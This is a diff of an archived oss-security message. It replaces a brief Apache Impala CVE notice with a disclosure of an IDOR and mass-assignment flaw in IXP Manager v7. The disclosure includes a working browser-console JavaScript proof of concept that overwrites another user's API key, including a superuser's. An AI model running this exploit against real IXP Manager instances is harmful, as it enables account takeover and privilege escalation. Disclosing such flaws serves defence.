@@ -1,29 +1,65 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2026/09/08/24
-Message-ID: <eef0476e-e251-e4f0-bce0-ac259bebe5e0@apache.org>
-Date: Tue, 08 Sep 2026 20:57:36 +0000
-From: Michael Smith <michaelsmith@...che.org>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2026/08/14/2
+Message-ID: <CA+W5nygF6YakOD0J7_p2eddNBmcQuLSfvfJMeeDL5P-LXPvDsg@mail.gmail.com>
+Date: Fri, 14 Aug 2026 20:24:08 +0800
+From: Bakabaka_9 <qilunuobakabaka9@...il.com>
 To: oss-security@...ts.openwall.com
-Subject: CVE-2026-65181: Apache Impala: RCE via External Data Source Class Loading 
+Subject: IXP Manager: Authenticated IDOR / BOLA + Mass Assignment in API Key Update Allows Overwrite of Other Users’ API Keys (incl. Superuser)
 Content-Type: text/plain; charset=utf-8
 
-Severity: important 
+Hi,
 
-Affected versions:
+In IXP Manager (tested on v7), an authenticated user with at least
+AUTH_CUSTUSER privileges can update or delete arbitrary API key records by
+directly addressing their numeric api_keys.id.
 
-- Apache Impala 2.7.0 through 4.5.1
+The update path mass-assigns request data into the ApiKey model, and the
+model permits the apiKey attribute itself to be mass-assigned. As a result,
+a low-privileged customer can overwrite another user's API key (including a
+superuser's) with an attacker-controlled value, and subsequently
+authenticate as that user via the API.
 
-Description:
+The list endpoint correctly scopes results to the current user:
 
-Insufficient authorization of Data Source tables in Impala 2.7-4.5 allows a client with privileges to upload a file to remote storage and create a table to execute arbitrary Java code.
-Users are recommended to upgrade to version 4.5.2, which fixes this issue.
+// app/Http/Controllers/ApiKeyController.php:159-167
 
-Credit:
+return ApiKey::where( 'user_id', Auth::id() )
 
-zhaokaifei ChinaTelecom (reporter)
 
-References:
+However, the update/delete paths do not enforce ownership.
 
-https://impala.apache.org/
-https://www.cve.org/CVERecord?id=CVE-2026-65181
+*Conditions required for exploitation:*
+
+
+   1. Valid authenticated account with at least AUTH_CUSTUSER
+   2. Ability to obtain a normal CSRF token for the session
+   3. Existence of a victim API key row
+   4. Knowledge (or enumeration) of the numeric api_keys.id
+   5. For superuser escalation, the target key must belong to a superuser
+   6. Victim user and default customer must not be disabled
+
+*Simple PoC (run in browser console while logged in as a customer):*
+
+const victimKeyId = 1; // target api_keys.id const newKey =
+"poc-admin-key-" + Date.now();
+
+const token = document.querySelector('meta[name="csrf-token"]')?.content ||
+document.querySelector('input[name="_token"]')?.value;
+
+await fetch(`/api-key/update/${victimKeyId}`, { method: "POST",
+credentials: "include", headers: { "Content-Type":
+"application/x-www-form-urlencoded" }, body: new URLSearchParams({ _token:
+token, _method: "PUT", apiKey: newKey, description: "overwritten by
+customer PoC", expires: "2030-01-01" }) });
+
+console.log(newKey);
+
+
+After a successful request the new key can be used for API authentication
+as the victim.
+
+*Suggested mitigation:*
+
+
+   - Update to latest IXP-Manager version
 
